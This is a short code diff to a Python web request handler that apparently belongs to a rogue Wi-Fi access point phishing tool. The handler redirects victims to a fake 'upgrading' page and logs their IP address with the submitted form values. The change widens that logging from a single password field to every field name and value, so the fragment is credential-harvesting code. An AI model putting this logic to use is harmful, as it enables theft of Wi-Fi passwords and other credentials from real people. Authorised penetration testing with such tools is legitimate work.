@@ -245,7 +245,7 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
                      'CONTENT_TYPE': self.headers['Content-Type'],
                      })
         for item in form.list:
-            if item.value:
+            if item.name and item.value:
                 self.send_response(301)
                 self.send_header('Location', '/upgrading.html')
                 self.end_headers()
@@ -253,7 +253,7 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
                 with open(wifi_webserver_tmp, "a+") as log_file:
                     log_file.write('[' + T + '*' + W + '] ' + O + "POST " +
                                    T + self.client_address[0] +
-                                   R + " password=" + item.value +
+                                   R + " " + item.name + "=" + item.value +
                                    W + "\n"
                                    )
                     log_file.close()
